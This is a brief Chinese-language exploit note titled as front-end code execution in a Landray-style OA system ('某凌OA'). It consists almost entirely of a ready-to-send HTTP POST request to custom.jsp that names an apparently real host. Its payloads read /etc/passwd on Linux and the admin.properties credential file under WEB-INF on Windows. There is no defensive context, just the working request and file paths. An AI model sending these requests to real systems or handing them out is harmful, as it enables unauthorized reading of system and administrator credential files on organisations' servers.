## 某凌OA前台代码执行
```
POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
Host: www.ynjd.cn:801
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: /
Connection: Keep-Alive
Content-Length: 42
Content-Type: application/x-www-form-urlencoded

var={"body":{"file":"file:///etc/passwd"}}
```
var={"body":{"file":"file:///etc/passwd"}}  // linux


var={"body":{"file":"/WEB-INF/KnssConfig/admin.properties"}}  //windows
